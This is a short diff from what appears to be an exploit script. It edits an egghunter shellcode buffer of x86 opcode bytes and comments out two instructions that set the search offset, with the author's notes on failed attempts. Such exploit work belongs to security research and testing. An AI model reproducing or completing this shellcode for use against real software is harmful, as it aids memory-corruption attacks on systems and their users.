@@ -23,8 +23,8 @@ eggh = (
 # "\x81\xC2\xF7\x04\x00\x00"            # add edx, 0x4f7 <- 1271 (decimal This may be too close unless offset is always the same
 # "\x81\xC2\xE8\x03\x00\x00"            # add edx, 0x3e8 (decimal 1000) < Tried something a little farther away, failed.
 ### 
-"\x8B\x15\x00\x00\x00\x00" # mov edx, eip
-"\x81\xC2\x6D\xEE\x07\x00" # add edx, 0x7ee6d (decimal 519789)
+# "\x8B\x15\x00\x00\x00\x00" # mov edx, eip
+# "\x81\xC2\x6D\xEE\x07\x00" # add edx, 0x7ee6d (decimal 519789)
 
 "\x42"                                # INC EDX
 "\x52"                                # PUSH EDX
